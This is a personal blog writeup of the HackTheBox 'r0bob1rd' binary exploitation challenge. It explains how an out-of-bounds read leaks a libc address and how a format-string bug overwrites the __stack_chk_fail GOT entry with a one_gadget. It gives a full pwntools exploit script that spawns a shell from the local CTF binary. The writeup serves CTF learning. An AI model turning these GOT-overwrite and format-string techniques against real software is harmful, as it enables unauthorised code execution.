---
title: "HTB: r0bob1rd Pwn Writeup"
date: 2026-02-18
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "hackthebox"
  - "htb"
  - "binary exploitation"
  - "reverse-engineering"
---

I'm back with my third week of challenge series: One pwn writeup a week. In this third week, I am again looking at another easy challenge from hackthebox: r0bob1rd. Let's call it robobird to make it easy to write. Challenge can be found here: <https://app.hackthebox.com/challenges/r0bob1rd>

Other pwn writeups I completed and more can be found under this category here: <https://yusuftas.net/categories/pwn/>

## Initial Look

I always start with checking what flags are enabled/disabled to see what I am dealing with.

![Checksec result](/assets/img/robobird_checksec.png)

Looking at this result, we can say:

* Stack canary is enabled, which detects buffer overflows. We might need to leak stack canary if we want to buffer overflow and override the return address.
* Partial Relro: Offsets at GOT are writable: If we can find a way to overwrite those offsets, we can direct libc calls to anywhere we want
* No PIE: No need to leak a memory from code space to figure where code is randomly loaded into the memory.
* RUNPATH is set: Oh thank you very very much, really I am so glad that is done. Last week I spent a good amount of time trying to figure out why the libc provided wasn't being used. RUNPATH loads the libc binary from the given relative path.
* NX enabled: No easy shell code running of the stack.   

## Bugs

Okay now it is time to figure out what sort of bugs the binary contain. I do this part in Ghidra, and analyze decompiled functions, strings etc. to see if there is anything interesting. This also gives me an idea on how the binary runs and what it takes from user and what it prints. After going through a couple of functions by following the flow of the code, I found that operation() function has some interesting bugs:

![Bugs](/assets/img/robobird_operation_bugs.png)

Compared to previous weeks, this one comes with multiple issues and attack vectors to utilize. At this point, I started to like this challenge more. Let's have a look at the bugs:

1. There is a buffer used for input and its size is set to 104 bytes. We will come back to this at third point.

2. If you look at if and else at 2nd mark closely, any given input is used to access the robobirdNames array without proper bound checking. This should give us arbitrary read around the memory where robobirdNames is stored. Looking at the code, we can see it is stored in data section of the binary.
![Arbitrary read](/assets/img/robobird_arbit_read.png)

3. There is a buffer overflow, an interesting one, to say the least. Buffer size is set to 104 bytes at mark 1, and fgets reads 106 bytes including the null terminator. So this is essentially a single byte overflow. Very interesting bug.
![Stack smash](/assets/img/robobird_stack_smash.png)

4. And finally most critical bug of the binary: format string vulnerability. Whatever user has provided is printed using printf directly. This should give us the ability to overwrite stuff from GOT.
![Format string bug](/assets/img/robobird_fs_bug.png)

### Attack Plan

This one involves multiple attack points, so we need to make an attack plan to get to the shell. Looking at our options, we can only overflow one byte which will trigger the stack canary check. So we can't ROP around the binary if we can't get to the return address and override it even if we managed to leak the stack canary in this instance. What we know is if stack smash is detected, program calls the libc function __stack_chk_fail. And guess where the offset for this function is stored, that is right in GOT. With the format string bug, we can override GOT entries, meaning by overriding GOT entry for __stack_chk_fail, we can redirect the code flow to somewhere else. Next question is where do we want to redirect to? Well we need a shell, so we will return to libc. To return to libc we will need to leak an address from libc to find the base address since it will be randomly put in memory due to ASLR. We should be able to do that using the arbitrary read bug we found above at 2nd mark. Now, if we summarize the attack plan:

1. Use arbitrary read bug to get a libc function's offset from GOT.
2. Utilize format string bug to overwrite GOT entries to control the flow of the binary to a one gadget.
3. Pad format string buffer to cause a stack smash.

If everything is done right, stack smash should call __stack_chk_fail which should be overwritten by a one gadget address, and that should hopefully pop a shell. One gadget here seemed to be a more appropriate solution. Since we can't ROP around, we can't put /bin/sh string into rdi and call system(). Maybe we could overwrite some more GOT entries to achieve something similar, but 106 bytes buffer may not be enough to do all the writes we need to execute for that. So, one gadget sounds more plausible if we can find a working one.

## Exploit

Now let's start applying the attack plan step by step to get to the shell.

### Libc Leak

Looking at the code, it takes an integer from user and prints something using robobirdNames array. And there is no bound checking, so we can provide any integer that points to any address in the code space. robobirdNames array is stored at 0x006020a0 in the .data section of the binary. I picked puts as my target to get the address. **At the time of leakage, puts has already been called, so its offset should already be dynamically resolved and stored in GOT.**

![Got](/assets/img/robobird_got.png)

GOT entry for puts is stored at address 0x00602020. So the input we need to give to the binary can be simply calculated as:

(0x00602020 - 0x006020a0) / 8 = -16
```python
io = start()

# -16 should put us at GOT entry for puts function:
# 0x006020a0 - 16 * 8 =  0x602020 
io.sendlineafter(b'R0bob1rd > ', b'-16')
io.recvuntil(b'You\'ve chosen: ')

# Now it should print the GOT entry for puts
puts_recv = io.recv(8).strip(b'\n')
puts_addr = u64(puts_recv.ljust(8, b'\x00'))
print(f'recv: {puts_recv}')
print(hex(puts_addr))

# Update libc base address
libc.address = puts_addr - libc.symbols['puts']
print(hex(libc.address))
```

### One gadgets

We need to figure out where we want to return to in libc to pop a shell. One gadgets are certain points in the libc binary that calls execve('/bin/sh') under certain conditions. If conditions are met, returning back to these points, one gadgets, should pop a shell. To find one gadgets I am using this tool: <https://github.com/david942j/one_gadget> . Looking at the supplied libc we can see three possible one gadgets:

![One gadgets](/assets/img/robobird_gadgets.png)

Now at this point, a reasonable person would debug and check when we are jumping to these gadgets if the shown conditions are met or not. Or you can just do like I do, just try each one of them one by one. I might come back to this at some point in future and try to do this more properly by looking at conditions, but for now the 2nd one worked for me and I will leave it at that. 

### Format String Vulnerability

Moving onto the next step, we need to figure out how to use format string vulnerability to return back to a one gadget. I will be honest, I am used to using pwntools for that, it has great functionality to build exploit strings automatically. So I will just stick with it and document my findings and issues. 

Once we find a format string bug, next thing to figure out is where in the stack our inputs get placed. This is used in write/read calculations, so finding that offset is critical. It is quite easy to find by sending a known input with a bunch of %p:

![Finding offset](/assets/img/robobird_findingoffset.png)

We can see that our input AAAAAAAA (0x41....) appeared on the 8th offset. We will use this offset = 8 in pwntools to create our payload. pwntools' format string functionality offers different ways to create the payload where some of them have more options. **Some generate longer outputs that might not fit into the buffer!** Here look at these two options:
```python
# v1
onegadget = libc.address + 0xe3b01

def send_fmt_payload(payload):
    plen = len(payload)
    print(payload)
    print(len(payload))

    padlen = 105 - plen
    payload += b'A'*padlen

    io.sendline(payload)

f = FmtStr(send_fmt_payload, offset=8)
f.write(elf.got['__stack_chk_fail'], onegadget)
f.execute_writes()


# v2
payload = fmtstr_payload(8, {elf.got['__stack_chk_fail']: onegadget}, write_size='short')
print(payload)
print(len(payload))

plen = len(payload)
padlen = 105 - plen
payload += b'A'*padlen
```

Looking at v1 and v2, the main difference is that we can't set write size in the first version. Using short instead of default byte size write makes the generated payload more compact. **With v1 in many runs I ended up getting more bytes than I could fit into the buffer**. With v1, in maybe one out of five runs, I could get less than 105 bytes depending on where libc ended up in memory. So if space is an issue, choosing the generator function version might be a better fit since it offers much more configuration than the FmtStr class. On the other hand, the class offers some automation functions that could be useful for a different problem. 

And finally 105 bytes is used to fill 104 bytes buffer with one byte overflow. The overflowed byte falls right into the stack canary to cause a stack smash. 

> Lesson of the day: Sometimes crashing a program may not be a bad thing, if you can control the flow of the crash.
{: .prompt-info }

## Final Code

Now let's put it all together in one final script
```python
from pwn import *

# Set up pwntools for the correct architecture
exe = './r0bob1rd'

context.binary = exe
elf  = ELF(exe)
libc = ELF('./glibc/libc.so.6')

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']
# context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

# Local
io = start()

# -16 should put us at GOT entry for puts function:
# 0x006020a0 - 16 * 8 =  0x602020 
io.sendlineafter(b'R0bob1rd > ', b'-16')
io.recvuntil(b'You\'ve chosen: ')

# Now it should print the GOT entry for puts
puts_recv = io.recv(8).strip(b'\n')
puts_addr = u64(puts_recv.ljust(8, b'\x00'))
print(f'recv: {puts_recv}')
print(hex(puts_addr))

# Update libc base address
libc.address = puts_addr - libc.symbols['puts']
print(hex(libc.address))

# One gadgets
# 0xe3afe 0xe3b01 0xe3b04
onegadget = libc.address + 0xe3b01

payload = fmtstr_payload(8, {elf.got['__stack_chk_fail']: onegadget}, write_size='short')
print(payload)
print(len(payload))

# Pad to overflow the buffer
plen = len(payload)
padlen = 105 - plen
payload += b'A'*padlen

io.sendline(payload)
io.interactive()
```

A couple of lessons I learned from this task:

* Look at all the functions at GOT, not just the usual puts, printf etc. Any function there can be potentially used if the binary can be prompted into going there.
* Stack canaries can be part of an exploit too.
* When generating payloads using libraries like pwntools, look at all possible configurations. Certain options can help with different requirements of the challenge.
* One gadgets are cool - but learn to check if conditions can be met. Maybe there could be cases where you can control such conditions and make them work. 

This is it from this challenge. Maybe it is time to move to medium challenges next week, we will see. As always, keep learning!